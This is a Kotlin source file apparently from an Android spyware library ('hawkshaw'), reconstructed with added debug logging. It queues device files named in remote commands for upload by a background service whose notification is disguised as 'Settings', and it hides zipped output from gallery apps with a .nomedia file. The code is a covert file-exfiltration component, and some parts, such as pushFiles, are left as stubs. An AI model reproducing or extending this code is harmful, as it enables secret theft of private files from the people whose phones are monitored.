package com.hawkshaw.library.features.media.filecrud

import android.content.Intent
import android.os.Environment
import android.util.Log // Added for Android logging
import com.hawkshaw.library.App
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.datalayer.room.AppDatabaseKt
import com.hawkshaw.library.datalayer.room.files.PushFileTaskEntity
import com.hawkshaw.library.logger.Logger
import com.hawkshaw.library.utils.MiscKt
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.Locale

private const val FILENAME_FORMAT = "yyyy-MM-dd_HH-mm-ss-SSS"
private const val TAG = "FileUpload"

/**
 * Get formatted date string for file naming
 */
private fun getFileNameDate(): String {
    Log.d(TAG, "[DEBUG] getFileNameDate called.")
    val formattedDate = SimpleDateFormat(FILENAME_FORMAT, Locale.getDefault()).format(System.currentTimeMillis())
    Log.d(TAG, "[DEBUG] getFileNameDate: Generated formatted date: $formattedDate")
    return formattedDate
}

/**
 * Get a path for zip file output
 */
fun getOutZipPath(): File {
    Log.d(TAG, "[DEBUG] getOutZipPath called.")
    var directory = Environment.getExternalStoragePublicDirectory(".zip")
    Log.d(TAG, "[DEBUG] getOutZipPath: Initial public directory: ${directory.absolutePath}")
    val externalFilesDir = App.getContext().getExternalFilesDir(".zip")
    Log.d(TAG, "[DEBUG] getOutZipPath: App's external files directory: ${externalFilesDir?.absolutePath}")

    // Prefer the app's external files directory if available
    if (externalFilesDir != null) {
        Log.d(TAG, "[DEBUG] getOutZipPath: Using app's external files directory.")
        directory = externalFilesDir
    } else {
        Log.d(TAG, "[DEBUG] getOutZipPath: App's external files directory is null, using public directory.")
    }
    Log.d(TAG, "[DEBUG] getOutZipPath: Selected directory for zip: ${directory.absolutePath}")

    // Ensure directory exists
    if (!directory.exists()) {
        Log.d(TAG, "[DEBUG] getOutZipPath: Directory does not exist. Creating directory: ${directory.absolutePath}")
        directory.mkdirs()
    }

    // Create .nomedia file to hide media from gallery apps
    val nomediaFile = File(directory, ".nomedia")
    if (!nomediaFile.exists()) {
        Log.d(TAG, "[DEBUG] getOutZipPath: .nomedia file does not exist. Creating: ${nomediaFile.absolutePath}")
        nomediaFile.createNewFile() // Consider adding error handling for createNewFile
    }

    // Create and return the zip file
    val zipFileName = "${getFileNameDate()}.zip"
    val zipFile = File(directory, zipFileName)
    Log.d(TAG, "[DEBUG] getOutZipPath: Attempting to create zip file: ${zipFile.absolutePath}")
    zipFile.createNewFile() // Consider adding error handling for createNewFile
    Log.d(TAG, "[DEBUG] getOutZipPath: Zip file created successfully: ${zipFile.absolutePath}")
    return zipFile
}

/**
 * Push a file to be uploaded
 */
suspend fun pushFile(fileRequest: Command.FileRequest): Any = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] pushFile called with FileRequest: $fileRequest")
    // Start the push file service with the file request
    val result = pushFileService(fileRequest)
    Log.d(TAG, "[DEBUG] pushFile: pushFileService returned. Result: $result (Unit expected for successful queueing)")
    return@withContext result
}

/**
 * Store file metadata in the database and start the upload service
 */
private suspend fun pushFileService(fileRequest: Command.FileRequest): Any = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] pushFileService called with FileRequest: $fileRequest")
    val file = File(fileRequest.path)
    Log.d(TAG, "[DEBUG] pushFileService: Checking file at path: ${fileRequest.path}")

    // Verify that the file exists
    if (!file.isFile) {
        Log.e(TAG, "[DEBUG] pushFileService: Path ${fileRequest.path} is not a file or does not exist. Aborting upload.")
        // Existing Logger.e is appropriate here.
        Logger.e(
            TAG,
            "PushFile: ${fileRequest.path} is not a file, aborting upload",
            b = false,
            i = 12,
            nothing = null
        )
        return@withContext Unit // Explicitly returning Unit as per original logic for this case
    }
    Log.d(TAG, "[DEBUG] pushFileService: File ${fileRequest.path} exists and is a file.")

    // Create task entity for the file
    val pushFileTask = PushFileTaskEntity(
        path = fileRequest.path,
        source = fileRequest.source,
        medium = fileRequest.medium,
        buffer = fileRequest.buffer
    )
    Log.d(TAG, "[DEBUG] pushFileService: Created PushFileTaskEntity: $pushFileTask")

    // Insert the task into the database
    Log.d(TAG, "[DEBUG] pushFileService: Getting database instance.")
    val db = AppDatabaseKt.db
    Log.d(TAG, "[DEBUG] pushFileService: Inserting PushFileTaskEntity into database.")
    db.pushFileTaskDao().insert(pushFileTask)
    Log.d(TAG, "[DEBUG] pushFileService: PushFileTaskEntity inserted into database.")

    // Start the service to handle the upload
    Log.d(TAG, "[DEBUG] pushFileService: Calling startPushFileService().")
    startPushFileService()

    Log.d(TAG, "[DEBUG] pushFileService completed for path: ${fileRequest.path}")
    return@withContext Unit // Explicitly returning Unit
}

/**
 * Push multiple files to be uploaded
 */
suspend fun pushFiles(filesRequest: Command.FilesRequest): Any = withContext(Dispatchers.IO) {
    Log.d(TAG, "[DEBUG] pushFiles called with FilesRequest: $filesRequest")
    // Process the files request and start the upload service
    // This would typically involve:
    // 1. Verifying all files exist
    // 2. Creating task entities for each file
    // 3. Inserting tasks into the database
    // 4. Starting the service to handle uploads
    Log.d(TAG, "[DEBUG] pushFiles: Current implementation only starts the service. Add more logs if file processing logic is added here.")

    startPushFileService()
    Log.d(TAG, "[DEBUG] pushFiles: startPushFileService called.")
    return@withContext Unit // Explicitly returning Unit
}

/**
 * Synchronize file uploads (process any pending uploads)
 */
fun syncPushFiles() {
    Log.d(TAG, "[DEBUG] syncPushFiles called.")
    startPushFileService()
    Log.d(TAG, "[DEBUG] syncPushFiles: startPushFileService called.")
}

/**
 * Start the service responsible for managing file uploads
 */
fun startPushFileService() {
    Log.d(TAG, "[DEBUG] startPushFileService called.")
    val intent = Intent(App.getContext(), PushFileManagerService::class.java)
    Log.d(TAG, "[DEBUG] startPushFileService: Created Intent for PushFileManagerService: $intent")
    // Existing MiscKt.startService is a library call, logging before it is good.
    MiscKt.startService(intent, "Settings", "Uploading files...", App.getContext())
    Log.d(TAG, "[DEBUG] startPushFileService: MiscKt.startService called for PushFileManagerService.")
}
